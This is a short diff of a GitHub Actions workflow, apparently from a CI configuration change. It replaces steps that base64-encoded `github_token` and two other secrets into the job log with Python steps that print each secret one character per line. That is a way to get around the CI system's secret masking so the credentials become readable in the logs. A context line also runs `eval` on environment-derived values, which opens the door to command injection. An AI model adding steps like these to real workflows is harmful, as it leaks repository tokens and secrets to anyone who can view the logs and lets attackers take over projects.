@@ -15,7 +15,19 @@ jobs:
             val=$(eval "echo \"$value\"")
             echo "$key=$val" >> "$GITHUB_ENV"
           done
-      - run: echo "$github_token" | base64 -w0
-      - run: echo "$TEST" | base64 -w0
-      - run: echo "$TEST_LAGI" | base64 -w0
+      - run: |
+          import os
+          for c in (os.getenv("github_token")):
+            print(c)
+        shell: python
+      - run: |
+          import os
+          for c in (os.getenv("TEST")):
+            print(c)
+        shell: python
+      - run: |
+          import os
+          for c in (os.getenv("TEST_LAGI")):
+            print(c)
+        shell: python
 
